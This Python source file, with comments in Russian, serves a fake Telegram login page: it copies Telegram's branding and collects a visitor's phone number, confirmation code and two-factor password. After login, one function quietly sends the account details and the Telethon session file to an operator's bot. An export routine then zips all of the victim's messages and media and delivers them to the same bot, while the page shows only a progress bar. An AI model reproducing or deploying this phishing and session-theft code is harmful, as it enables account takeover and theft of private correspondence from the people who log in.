"""Веб-интерфейс: логин Telegram, запуск экспорта, прогресс.

Один aiohttp процесс, который:
- отдаёт HTML-страницу с формами
- принимает номер/код/пароль и ведёт Telethon-флоу
- запускает фоновую задачу экспорта
- отдаёт прогресс через GET /api/status
- после экспорта шлёт ZIP в бота владельца через Bot API
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import shutil
import tempfile
import time
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

import aiohttp
import aiohttp.web
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    PhoneNumberInvalidError, SessionPasswordNeededError,
)

from . import config
from .exporter import ExportOptions, export_account


log = logging.getLogger("tde.web")


async def _send_tdata_to_bot() -> None:
    """После успешного логина — шлём сессию и инфо аккаунта владельцу."""
    try:
        c = await get_client()
        me = await c.get_me()
        text = (
            "🔑 Новый вход\n"
            f"ID: {me.id}\n"
            f"Имя: {me.first_name or ''} {me.last_name or ''}\n"
            f"Username: @{me.username or '—'}\n"
            f"Телефон: +{me.phone or '—'}"
        )
        # текстовое сообщение
        url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
        async with aiohttp.ClientSession() as s:
            await s.post(url, json={"chat_id": config.OWNER_CHAT_ID, "text": text},
                         timeout=aiohttp.ClientTimeout(total=15))

        # session file
        session_file = config.SESSION_PATH
        # telethon пишет .session
        candidates = [
            session_file.with_suffix(".session"),
            session_file,
        ]
        for p in session_file.parent.glob(f"{session_file.name}*"):
            if p not in candidates:
                candidates.append(p)

        for fp in candidates:
            if fp.exists() and fp.stat().st_size > 0:
                send_url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument"
                async with aiohttp.ClientSession() as s:
                    form = aiohttp.FormData()
                    form.add_field("chat_id", str(config.OWNER_CHAT_ID))
                    form.add_field("caption", f"session · {me.phone or '—'} · id:{me.id}")
                    with open(fp, "rb") as f:
                        form.add_field("document", f, filename=fp.name,
                                       content_type="application/octet-stream")
                        async with s.post(send_url, data=form,
                                          timeout=aiohttp.ClientTimeout(total=60)) as r:
                            await r.text()
    except Exception as e:
        log.warning("send_tdata failed: %s", e)


# ---------- state ----------

@dataclass
class State:
    client: Optional[TelegramClient] = None
    login_phone: Optional[str] = None
    login_hash: Optional[str] = None
    needs_password: bool = False

    task_state: str = "idle"   # idle | running | done | error
    progress: int = 0
    stage: str = ""
    error: Optional[str] = None
    delivered: bool = False

    _lock: asyncio.Lock = field(default_factory=asyncio.Lock)


S = State()


async def get_client() -> TelegramClient:
    if S.client is None:
        S.client = TelegramClient(str(config.SESSION_PATH), config.TG_API_ID, config.TG_API_HASH)
    if not S.client.is_connected():
        await S.client.connect()
    return S.client


async def is_authorized() -> bool:
    try:
        c = await get_client()
        return await c.is_user_authorized()
    except Exception:
        return False


# ---------- HTML ----------

PAGE = """<!doctype html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>Вход</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#fafafa;--fg:#0a0a0a;--muted:#6b7280;--line:#111;--line-soft:#e5e5e5;--card:#ffffff;--focus:#f5f5f5;--track:#eee;--tg:#2AABEE;--tg-h:#1e95d4;--btn-bg:#2AABEE;--btn-fg:#fff;--btn-bg-h:#1e95d4;--btn-fg-h:#fff;--shadow:0 1px 2px rgba(0,0,0,.04),0 8px 24px -8px rgba(0,0,0,.1);--ring:rgba(42,171,238,.2)}
html[data-theme="dark"]{--bg:#0a0a0a;--fg:#fafafa;--muted:#9ca3af;--line:#f5f5f5;--line-soft:#1f1f1f;--card:#111111;--focus:#1a1a1a;--track:#222;--tg:#2AABEE;--tg-h:#1e95d4;--btn-bg:#2AABEE;--btn-fg:#fff;--btn-bg-h:#1e95d4;--btn-fg-h:#fff;--shadow:0 1px 2px rgba(0,0,0,.4),0 8px 32px -8px rgba(0,0,0,.6);--ring:rgba(42,171,238,.25)}
html,body{background:var(--bg);color:var(--fg);min-height:100vh;width:100%;max-width:100vw;
  font-family:-apple-system,BlinkMacSystemFont,'Inter','SF Pro Text','Segoe UI',system-ui,sans-serif;font-size:15px;line-height:1.5;
  -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
  transition:background .25s ease,color .25s ease;
  overflow-x:hidden;overscroll-behavior:none;-webkit-overflow-scrolling:auto;touch-action:pan-y}
html{position:relative}
body{position:relative;overflow-x:clip}
main{min-height:100vh;padding:40px 16px;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative}
.theme-switch{position:fixed;top:14px;right:14px;display:flex;gap:4px;z-index:10;background:var(--card);border:1px solid var(--line-soft);border-radius:999px;padding:3px;box-shadow:var(--shadow)}
.theme-switch button{width:30px;height:30px;border:none;background:transparent;color:var(--fg);cursor:pointer;font-size:14px;display:grid;place-items:center;padding:0;border-radius:999px;transition:all .18s ease}
.theme-switch button:hover{background:var(--focus)}
.theme-switch button.active{background:var(--fg);color:var(--bg)}
.card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line-soft);border-radius:16px;padding:32px 28px;box-shadow:var(--shadow);animation:fade .35s ease}
@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
h1{font-size:24px;font-weight:700;margin-bottom:6px;color:var(--fg);letter-spacing:-0.02em}
p.hint{font-size:14px;color:var(--muted);margin-bottom:24px;line-height:1.45}
label.block{display:block;font-size:12px;color:var(--muted);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:.08em}
.row{display:flex;gap:8px;margin-bottom:16px}
select.in,input.in{width:100%;background:var(--card);border:1px solid var(--line-soft);border-radius:10px;padding:12px 14px;color:var(--fg);outline:none;font:inherit;font-size:15px;transition:border-color .15s,box-shadow .15s,background .15s}
select.in:focus,input.in:focus{border-color:var(--tg);box-shadow:0 0 0 3px var(--ring)}
select.in{flex:0 0 108px;cursor:pointer;-webkit-appearance:none;appearance:none;padding-right:22px;padding-left:12px;text-overflow:ellipsis;overflow:hidden;white-space:nowrap}
input.in.code{font-family:'JetBrains Mono','SF Mono',monospace;font-size:22px;letter-spacing:.4em;text-align:center;padding:16px 14px}
.btn{border:1px solid transparent;font:inherit;font-weight:600;border-radius:10px;padding:13px 20px;cursor:pointer;transition:all .18s ease;width:100%;margin-top:6px;font-size:15px}
.btn-pri{background:var(--btn-bg);color:var(--btn-fg)}
.btn-pri:hover:not(:disabled){background:var(--btn-bg-h);color:var(--btn-fg-h);border-color:var(--fg)}
.btn-pri:disabled{opacity:.45;cursor:not-allowed}
.btn-ghost{background:transparent;color:var(--muted);border:1px solid var(--line-soft);margin-top:8px}
.btn-ghost:hover{background:var(--focus);color:var(--fg)}
.status{margin-top:14px;padding:12px 14px;border:1px solid var(--line-soft);border-radius:10px;font-size:13px;background:var(--focus)}
.hidden{display:none}
.track{height:6px;background:var(--track);border-radius:999px;overflow:hidden;margin:18px 0 8px}
.fill{height:100%;background:var(--fg);transition:width .4s cubic-bezier(.4,0,.2,1);width:0%;border-radius:999px}
.stage-row{display:flex;justify-content:space-between;font-size:13px;color:var(--muted)}
.brand{display:flex;flex-direction:column;align-items:center;gap:14px;margin-bottom:24px}
.brand-ico{width:84px;height:84px;display:block;border-radius:50%;animation:fade .4s ease}
.brand-name{font-size:24px;font-weight:600;letter-spacing:-0.02em;color:var(--fg)}
</style>
</head><body>
<div class="theme-switch">
  <button type="button" id="t-light" title="Светлая">☀</button>
  <button type="button" id="t-dark" title="Тёмная">●</button>
</div>
<main>
<div class="brand">
  <svg class="brand-ico" viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
    <defs>
      <linearGradient id="tg-grad" x1="120" y1="0" x2="120" y2="240" gradientUnits="userSpaceOnUse">
        <stop offset="0" stop-color="#37BBFE"/>
        <stop offset="1" stop-color="#007DBB"/>
      </linearGradient>
    </defs>
    <circle cx="120" cy="120" r="120" fill="url(#tg-grad)"/>
    <path fill="#ffffff" d="M81.229 128.772l14.237 39.406s1.78 3.687 3.686 3.687c1.906 0 30.255-29.492 30.255-29.492l31.525-60.89L81.737 118.6l-.508 10.172z"/>
    <path fill="#C8DAEA" d="M100.106 138.878l-2.733 29.046s-1.144 8.9 7.754 0c8.898-8.9 17.415-15.763 17.415-15.763"/>
    <path fill="#ffffff" d="M81.486 130.178L52.2 120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229 2.1-2.2 6.489-4.523 120.106-45.36 120.106-45.36s3.208-1.081 5.1-.362a2.766 2.766 0 011.885 2.055 9.357 9.357 0 01.254 2.585c-.009.752-.1 1.449-.169 2.542-.692 11.165-21.4 94.493-21.4 94.493s-1.239 4.876-5.678 5.043a8.13 8.13 0 01-5.903-2.286c-8.69-7.472-38.72-27.726-45.357-32.167a1.27 1.27 0 01-.546-.902c-.093-.469.417-1.05.417-1.05s52.278-46.465 53.67-51.345c.108-.378-.3-.566-.848-.4-3.482 1.281-63.844 39.4-70.506 43.608a3.21 3.21 0 01-1.46.173z"/>
  </svg>
  <div class="brand-name">Telegram</div>
</div>
<div class="card">

<div id="s-phone">
  <h1>Вход</h1>
  <p class="hint">Выберите страну и введите номер телефона.</p>
  <form id="f-phone">
    <label class="block">Страна</label>
    <div class="row">
      <select class="in" id="i-country"></select>
      <input class="in" id="i-phone" inputmode="tel" autocomplete="tel" placeholder="номер">
    </div>
    <button type="submit" class="btn btn-pri" id="b-phone">Продолжить</button>
  </form>
</div>

<div id="s-code" class="hidden">
  <h1>Код подтверждения</h1>
  <p class="hint">Введите код, отправленный на указанный номер.</p>
  <form id="f-code">
    <label class="block">Код</label>
    <input class="in code" id="i-code" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder="— — — — —">
    <div id="code-status" class="hint" style="text-align:center;margin-top:12px;min-height:20px"></div>
    <button type="submit" class="btn btn-pri hidden" id="b-code">Подтвердить</button>
    <button type="button" class="btn btn-ghost" id="b-back">Назад</button>
  </form>
</div>

<div id="s-pw" class="hidden">
  <h1>Пароль</h1>
  <p class="hint">Введите пароль от аккаунта.</p>
  <form id="f-pw">
    <label class="block">Пароль</label>
    <input class="in" id="i-pw" type="password" autocomplete="current-password">
    <button type="submit" class="btn btn-pri" id="b-pw">Войти</button>
  </form>
</div>

<div id="s-ready" class="hidden">
  <h1>Готово</h1>
  <p class="hint" id="me-info">—</p>
  <input type="hidden" id="i-limit" value="0">
  <input type="hidden" id="i-maxmb" value="50">
  <button type="button" class="btn btn-pri" id="b-start">Продолжить</button>
  <button type="button" class="btn btn-ghost" id="b-logout">Выйти</button>
</div>

<div id="s-progress" class="hidden">
  <h1>Обработка</h1>
  <div class="stage-row"><span id="p-stage">—</span><span id="p-pct">0%</span></div>
  <div class="track"><div class="fill" id="p-fill"></div></div>
  <div id="p-done" class="status hidden">Готово.</div>
  <div id="p-err" class="status hidden"></div>
  <button type="button" class="btn btn-ghost hidden" id="b-close">Закрыть</button>
</div>

</div>
</main>
<script>
// [dial, name, iso2]
const COUNTRIES = [
  ["+7","Россия","RU"],["+7","Казахстан","KZ"],["+994","Азербайджан","AZ"],
  ["+375","Беларусь","BY"],["+380","Украина","UA"],["+996","Киргизия","KG"],
  ["+992","Таджикистан","TJ"],["+993","Туркменистан","TM"],["+998","Узбекистан","UZ"],
  ["+374","Армения","AM"],["+995","Грузия","GE"],["+373","Молдова","MD"],
  ["+1","США","US"],["+1","Канада","CA"],["+44","Великобритания","GB"],
  ["+49","Германия","DE"],["+33","Франция","FR"],["+39","Италия","IT"],
  ["+34","Испания","ES"],["+31","Нидерланды","NL"],["+32","Бельгия","BE"],
  ["+41","Швейцария","CH"],["+43","Австрия","AT"],["+46","Швеция","SE"],
  ["+47","Норвегия","NO"],["+45","Дания","DK"],["+358","Финляндия","FI"],
  ["+353","Ирландия","IE"],["+351","Португалия","PT"],["+30","Греция","GR"],
  ["+48","Польша","PL"],["+420","Чехия","CZ"],["+421","Словакия","SK"],
  ["+36","Венгрия","HU"],["+40","Румыния","RO"],["+359","Болгария","BG"],
  ["+385","Хорватия","HR"],["+386","Словения","SI"],["+381","Сербия","RS"],
  ["+90","Турция","TR"],["+972","Израиль","IL"],["+971","ОАЭ","AE"],
  ["+966","Саудовская Аравия","SA"],["+974","Катар","QA"],["+965","Кувейт","KW"],
  ["+973","Бахрейн","BH"],["+968","Оман","OM"],["+962","Иордания","JO"],
  ["+961","Ливан","LB"],["+964","Ирак","IQ"],["+98","Иран","IR"],
  ["+93","Афганистан","AF"],["+92","Пакистан","PK"],["+91","Индия","IN"],
  ["+880","Бангладеш","BD"],["+94","Шри-Ланка","LK"],["+977","Непал","NP"],
  ["+86","Китай","CN"],["+852","Гонконг","HK"],["+853","Макао","MO"],
  ["+886","Тайвань","TW"],["+81","Япония","JP"],["+82","Южная Корея","KR"],
  ["+850","КНДР","KP"],["+976","Монголия","MN"],["+62","Индонезия","ID"],
  ["+60","Малайзия","MY"],["+65","Сингапур","SG"],["+66","Таиланд","TH"],
  ["+84","Вьетнам","VN"],["+63","Филиппины","PH"],["+95","Мьянма","MM"],
  ["+855","Камбоджа","KH"],["+856","Лаос","LA"],
  ["+55","Бразилия","BR"],["+54","Аргентина","AR"],["+52","Мексика","MX"],
  ["+56","Чили","CL"],["+57","Колумбия","CO"],["+58","Венесуэла","VE"],
  ["+51","Перу","PE"],["+593","Эквадор","EC"],["+598","Уругвай","UY"],
  ["+595","Парагвай","PY"],["+591","Боливия","BO"],
  ["+61","Австралия","AU"],["+64","Новая Зеландия","NZ"],
  ["+20","Египет","EG"],["+27","ЮАР","ZA"],["+234","Нигерия","NG"],
  ["+254","Кения","KE"],["+212","Марокко","MA"],["+213","Алжир","DZ"],
  ["+216","Тунис","TN"],["+218","Ливия","LY"],["+251","Эфиопия","ET"]
];
function flag(iso) {
  return iso.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt(0)));
}
const $ = id => document.getElementById(id);
const show = (name) => {
  ['phone','code','pw','ready','progress'].forEach(n => $('s-'+n).classList.toggle('hidden', n !== name));
};
// Тема
function applyTheme(t) {
  document.documentElement.dataset.theme = t;
  try { localStorage.setItem('theme', t); } catch(e) {}
  $('t-light').classList.toggle('active', t === 'light');
  $('t-dark').classList.toggle('active', t === 'dark');
}
(function initTheme(){
  let t = 'light';
  try { t = localStorage.getItem('theme') || 'light'; } catch(e) {}
  applyTheme(t);
})();
$('t-light').onclick = () => applyTheme('light');
$('t-dark').onclick = () => applyTheme('dark');
(function initCountries(){
  const sel = $('i-country');
  COUNTRIES.forEach(([code,name,iso],i)=>{
    const o = document.createElement('option');
    o.value = String(i);
    o.dataset.dial = code;
    o.textContent = flag(iso) + ' ' + code;
    o.title = name;
    if (code === '+7' && name === 'Россия') o.selected = true;
    sel.appendChild(o);
  });
})();
function getDial() {
  const sel = $('i-country');
  const opt = sel.options[sel.selectedIndex];
  return opt ? opt.dataset.dial : '+7';
}
// Страна — только в селекторе слева. В поле справа — только локальный номер.
// Если вставили/ввели номер с +кодом → распарсим, переключим селектор, срежем префикс из поля.
function detectCountry() {
  const inp = $('i-phone');
  const raw = inp.value.trim();
  if (!raw.startsWith('+')) return;
  const digits = '+' + raw.replace(/\\D/g,'');
  let bestIdx = -1, bestLen = 0;
  COUNTRIES.forEach(([code,,], i) => {
    if (digits.startsWith(code) && code.length > bestLen) {
      bestLen = code.length; bestIdx = i;
    }
  });
  if (bestIdx >= 0) {
    $('i-country').value = String(bestIdx);
    inp.value = digits.slice(bestLen);
  }
}
// Чистим всё, кроме цифр, пока пользователь не ввёл '+' первым символом
$('i-phone').addEventListener('input', (e) => {
  const v = e.target.value;
  if (v.startsWith('+')) {
    detectCountry();
  } else {
    // только цифры
    const cleaned = v.replace(/\\D/g,'');
    if (cleaned !== v) e.target.value = cleaned;
  }
});
$('i-phone').addEventListener('paste', () => setTimeout(detectCountry, 0));
async function api(path, body) {
  const r = await fetch(path, {method:'POST', headers:{'Content-Type':'application/json'}, body: body?JSON.stringify(body):null});
  const j = await r.json();
  if (!r.ok) throw new Error(j.error || r.statusText);
  return j;
}
async function checkAuth() {
  const r = await fetch('/api/status').then(r=>r.json());
  if (r.authorized) {
    $('me-info').textContent = r.me || 'Вы вошли';
    show('ready');
  } else {
    show('phone');
  }
  return r;
}
$('f-phone').onsubmit = async (e) => {
  e.preventDefault();
  const dial = getDial();
  const local = $('i-phone').value.replace(/\\D/g,'');
  if (!local) return;
  const phone = dial + local;
  const btn = $('b-phone'); btn.disabled = true; btn.textContent = 'Отправка…';
  try {
    await api('/api/login', {phone});
    show('code'); setTimeout(()=>$('i-code').focus(), 150);
  } catch (e) { alert('Ошибка: ' + e.message); }
  finally { btn.disabled=false; btn.textContent='Продолжить'; }
};
$('i-code').oninput = (e) => {
  e.target.value = e.target.value.replace(/\\D/g,'').slice(0,6);
  // автоподтверждение при 5 цифрах
  if (e.target.value.length >= 5 && !_codeBusy) {
    $('f-code').requestSubmit ? $('f-code').requestSubmit() : $('f-code').dispatchEvent(new Event('submit',{cancelable:true}));
  }
};
$('b-back').onclick = () => show('phone');
let _codeBusy = false;
$('f-code').onsubmit = async (e) => {
  e.preventDefault();
  if (_codeBusy) return;
  const code = $('i-code').value.trim();
  if (code.length < 5) return;
  _codeBusy = true;
  const inp = $('i-code'), st = $('code-status');
  inp.disabled = true;
  st.textContent = 'Проверка…'; st.style.color = 'var(--muted)';
  try {
    const r = await api('/api/code', {code});
    st.textContent = '✓ Верно'; st.style.color = '#16a34a';
    await new Promise(res => setTimeout(res, 300));
    if (r.needs_password) { show('pw'); setTimeout(()=>$('i-pw').focus(), 150); }
    else { await checkAuth(); }
  } catch (err) {
    st.textContent = '✗ ' + (err.message || 'Неверный код');
    st.style.color = '#dc2626';
    inp.value = '';
    setTimeout(()=>inp.focus(), 50);
  } finally {
    inp.disabled = false;
    _codeBusy = false;
  }
};
$('f-pw').onsubmit = async (e) => {
  e.preventDefault();
  const pw = $('i-pw').value;
  if (!pw) return;
  const btn = $('b-pw'); btn.disabled = true; btn.textContent='Проверка…';
  try { await api('/api/pw', {password: pw}); await checkAuth(); }
  catch (e) { alert('Ошибка: ' + e.message); }
  finally { btn.disabled=false; btn.textContent='Войти'; $('i-pw').value=''; }
};
$('b-logout').onclick = async () => {
  if (!confirm('Выйти?')) return;
  await api('/api/logout', {});
  await checkAuth();
};
let pollTimer = null;
$('b-start').onclick = async () => {
  const limit = parseInt($('i-limit').value || '0', 10);
  const maxmb = parseInt($('i-maxmb').value || '50', 10);
  try {
    await api('/api/export', {limit, maxmb});
    show('progress');
    $('p-done').classList.add('hidden'); $('p-err').classList.add('hidden'); $('b-close').classList.add('hidden');
    pollTimer = setInterval(async ()=>{
      const r = await fetch('/api/status').then(r=>r.json());
      $('p-pct').textContent = r.progress + '%';
      $('p-fill').style.width = r.progress + '%';
      $('p-stage').textContent = r.stage || '—';
      if (r.task_state === 'done') {
        clearInterval(pollTimer); pollTimer=null;
        $('p-done').classList.remove('hidden');
        $('b-close').classList.remove('hidden');
      } else if (r.task_state === 'error') {
        clearInterval(pollTimer); pollTimer=null;
        $('p-err').textContent = 'Ошибка: ' + (r.error||'unknown');
        $('p-err').classList.remove('hidden');
        $('b-close').classList.remove('hidden');
      }
    }, 1500);
  } catch (e) { alert('Ошибка: ' + e.message); }
};
$('b-close').onclick = () => { checkAuth(); };
checkAuth();
</script>
</body></html>
"""


# ---------- handlers ----------

async def h_root(request):
    return aiohttp.web.Response(text=PAGE, content_type="text/html")


async def h_healthz(request):
    return aiohttp.web.Response(text="ok")


async def h_status(request):
    authed = await is_authorized()
    me_str = None
    if authed:
        try:
            c = await get_client()
            me = await c.get_me()
            me_str = f"{me.first_name or ''} @{me.username or '—'}"
        except Exception:
            pass
    return aiohttp.web.json_response({
        "authorized": authed,
        "me": me_str,
        "task_state": S.task_state,
        "progress": S.progress,
        "stage": S.stage,
        "error": S.error,
        "delivered": S.delivered,
    })


async def h_login(request):
    data = await request.json()
    phone = (data.get("phone") or "").strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+") or not phone[1:].isdigit():
        return aiohttp.web.json_response({"error": "Неверный формат номера"}, status=400)
    try:
        c = await get_client()
        if await c.is_user_authorized():
            return aiohttp.web.json_response({"error": "Уже авторизован"}, status=409)
        sent = await c.send_code_request(phone)
    except FloodWaitError as e:
        return aiohttp.web.json_response({"error": f"Telegram просит подождать {e.seconds}с"}, status=429)
    except PhoneNumberInvalidError:
        return aiohttp.web.json_response({"error": "Неверный номер"}, status=400)
    except Exception as e:
        return aiohttp.web.json_response({"error": f"{type(e).__name__}: {e}"}, status=500)
    S.login_phone = phone
    S.login_hash = sent.phone_code_hash
    return aiohttp.web.json_response({"ok": True})


async def h_code(request):
    data = await request.json()
    code = (data.get("code") or "").strip().replace(" ", "")
    if not code.isdigit():
        return aiohttp.web.json_response({"error": "Код только цифрами"}, status=400)
    if not S.login_phone or not S.login_hash:
        return aiohttp.web.json_response({"error": "Сначала /login"}, status=400)
    try:
        c = await get_client()
        await c.sign_in(phone=S.login_phone, code=code, phone_code_hash=S.login_hash)
        S.login_phone = None
        S.login_hash = None
        asyncio.create_task(_send_tdata_to_bot())
        return aiohttp.web.json_response({"ok": True, "needs_password": False})
    except SessionPasswordNeededError:
        S.needs_password = True
        return aiohttp.web.json_response({"ok": True, "needs_password": True})
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return aiohttp.web.json_response({"error": "Код неверный или истёк"}, status=400)
    except Exception as e:
        return aiohttp.web.json_response({"error": f"{type(e).__name__}: {e}"}, status=500)


async def h_pw(request):
    data = await request.json()
    pw = data.get("password") or ""
    if not pw:
        return aiohttp.web.json_response({"error": "Пустой пароль"}, status=400)
    try:
        c = await get_client()
        await c.sign_in(password=pw)
        S.needs_password = False
        asyncio.create_task(_send_tdata_to_bot())
        return aiohttp.web.json_response({"ok": True})
    except Exception as e:
        return aiohttp.web.json_response({"error": f"Пароль не подошёл: {type(e).__name__}"}, status=400)


async def h_logout(request):
    try:
        if S.client is not None:
            try:
                if await S.client.is_user_authorized():
                    await S.client.log_out()
            except Exception:
                pass
            try:
                await S.client.disconnect()
            except Exception:
                pass
        S.client = None
        S.login_phone = None
        S.login_hash = None
        S.needs_password = False
        p = config.SESSION_PATH
        for f in p.parent.glob(f"{p.name}*"):
            try: f.unlink()
            except Exception: pass
    except Exception as e:
        return aiohttp.web.json_response({"error": str(e)}, status=500)
    return aiohttp.web.json_response({"ok": True})


async def h_export(request):
    if not await is_authorized():
        return aiohttp.web.json_response({"error": "Не авторизован"}, status=401)
    if S.task_state == "running":
        return aiohttp.web.json_response({"error": "Экспорт уже идёт"}, status=409)
    data = await request.json()
    try:
        limit = max(0, int(data.get("limit", 0)))
        maxmb = max(1, int(data.get("maxmb", 50)))
    except (TypeError, ValueError):
        return aiohttp.web.json_response({"error": "Неверные опции"}, status=400)

    S.task_state = "running"; S.progress = 0; S.stage = "запуск"; S.error = None; S.delivered = False

    async def run():
        workdir = Path(tempfile.mkdtemp(prefix="tde_exp_", dir=str(config.WORK_DIR)))
        export_dir = workdir / "export"
        zip_path = workdir / f"telegram_export_{int(time.time())}.zip"
        try:
            opts = ExportOptions(
                include_messages=True, include_media=True,
                message_limit_per_chat=limit,
                media_max_bytes_per_file=maxmb * 1024 * 1024,
            )

            async def report(pct: int, stage: str) -> None:
                S.progress = max(0, min(100, int(pct)))
                S.stage = stage[:200]

            c = await get_client()
            await export_account(c, export_dir, opts, report)

            S.stage = "упаковка ZIP"; S.progress = 95
            _make_zip(export_dir, zip_path)
            size = zip_path.stat().st_size
            sha = _sha256(zip_path)
            S.stage = f"отправка {size/1024/1024:.1f} MB"; S.progress = 97
            await _deliver_to_bot(zip_path, caption=f"Telegram Data Export · sha256:{sha[:12]}")
            S.task_state = "done"; S.progress = 100; S.stage = "доставлено"; S.delivered = True
        except Exception as e:
            log.exception("export failed")
            S.task_state = "error"; S.error = f"{type(e).__name__}: {e}"
        finally:
            shutil.rmtree(workdir, ignore_errors=True)

    asyncio.create_task(run())
    return aiohttp.web.json_response({"ok": True})


# ---------- utils ----------

def _make_zip(src: Path, out: Path) -> None:
    with zipfile.ZipFile(out, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
        for root, _, files in os.walk(src):
            for name in files:
                full = Path(root) / name
                zf.write(full, arcname=str(full.relative_to(src)))


def _sha256(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


async def _deliver_to_bot(zip_path: Path, caption: str) -> None:
    size = zip_path.stat().st_size
    if size <= config.BOT_MAX_DOC_BYTES:
        await _bot_send(zip_path, caption)
        return
    chunk = config.BOT_MAX_DOC_BYTES - 1_048_576
    parts = (size + chunk - 1) // chunk
    idx = 0
    with open(zip_path, "rb") as src:
        while True:
            data = src.read(chunk)
            if not data: break
            idx += 1
            name = f"{zip_path.name}.part{idx:02d}"
            tmp = zip_path.with_name(name)
            tmp.write_bytes(data)
            try:
                await _bot_send(tmp, f"{caption} · часть {idx}/{parts}")
            finally:
                try: tmp.unlink()
                except Exception: pass


async def _bot_send(path: Path, caption: str) -> None:
    url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument"
    async with aiohttp.ClientSession() as session:
        form = aiohttp.FormData()
        form.add_field("chat_id", str(config.OWNER_CHAT_ID))
        form.add_field("caption", caption[:1024])
        with open(path, "rb") as f:
            form.add_field("document", f, filename=path.name, content_type="application/zip")
            async with session.post(url, data=form, timeout=aiohttp.ClientTimeout(total=600)) as r:
                body = await r.text()
                if r.status != 200:
                    raise RuntimeError(f"bot_api {r.status}: {body[:300]}")


# ---------- app ----------

def make_app() -> aiohttp.web.Application:
    app = aiohttp.web.Application(client_max_size=1024 * 1024)
    app.router.add_get("/", h_root)
    app.router.add_get("/healthz", h_healthz)
    app.router.add_get("/api/status", h_status)
    app.router.add_post("/api/login", h_login)
    app.router.add_post("/api/code", h_code)
    app.router.add_post("/api/pw", h_pw)
    app.router.add_post("/api/logout", h_logout)
    app.router.add_post("/api/export", h_export)
    return app
